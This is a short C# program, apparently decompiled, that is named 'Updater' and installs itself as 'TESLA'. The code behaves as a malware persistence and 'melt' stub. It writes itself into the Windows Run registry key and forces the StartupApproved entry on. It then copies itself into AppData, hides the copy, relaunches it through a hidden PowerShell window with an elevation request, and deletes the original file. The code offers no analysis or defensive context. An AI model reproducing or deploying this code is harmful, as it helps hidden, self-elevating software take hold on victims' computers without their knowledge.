using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Updater;

internal class Program
{
	private static string InstallName = "TESLA";

	private static string MainLocation = Process.GetCurrentProcess().MainModule!.FileName;

	private static string MeltLocation = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), InstallName + ".exe");

	private static void Main(string[] args)
	{
		if (args.Length != 0 && File.Exists(args[0]))
		{
			try
			{
				File.Delete(args[0]);
			}
			catch
			{
			}
		}
		Install(Install: true);
		Melt(runas: true);
		Console.ReadLine();
	}

	private static void Install(bool Install = false)
	{
		if (Install)
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.SetValue(InstallName, MainLocation);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", writable: true);
			byte[] value = new byte[11]
			{
				2, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0
			};
			registryKey?.SetValue(InstallName, value, RegistryValueKind.Binary);
		}
		else
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.DeleteValue(InstallName);
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", writable: true)?.DeleteValue(InstallName);
		}
	}

	private static void Hide(string FilePath)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(FilePath);
			fileInfo.Attributes = FileAttributes.Hidden;
		}
		catch
		{
		}
	}

	private static void Melt(bool runas = false, bool DeleteOld = false)
	{
		if (MainLocation.ToLower().Equals(MeltLocation.ToLower()))
		{
			return;
		}
		try
		{
			bool flag = false;
			if (File.Exists(MeltLocation))
			{
				try
				{
					File.Delete(MeltLocation);
					flag = true;
				}
				catch
				{
					flag = false;
				}
			}
			else
			{
				flag = true;
			}
			if (flag && !File.Exists(MeltLocation))
			{
				byte[] bytes = File.ReadAllBytes(MainLocation);
				File.WriteAllBytes(MeltLocation, bytes);
			}
		}
		catch
		{
		}
		if (!File.Exists(MeltLocation))
		{
			return;
		}
		Hide(MeltLocation);
		try
		{
			string text = "Start-Process -FilePath " + MeltLocation + " -WindowStyle Hidden";
			if (runas)
			{
				text += " -Verb runas";
			}
			if (DeleteOld)
			{
				text = text + " -ArgumentList " + MainLocation;
			}
			Process process = new Process();
			process.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
			process.StartInfo.Arguments = text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			if (runas)
			{
				process.StartInfo.Verb = "runas";
			}
			process.Start();
			Environment.Exit(0);
		}
		catch
		{
		}
	}
}
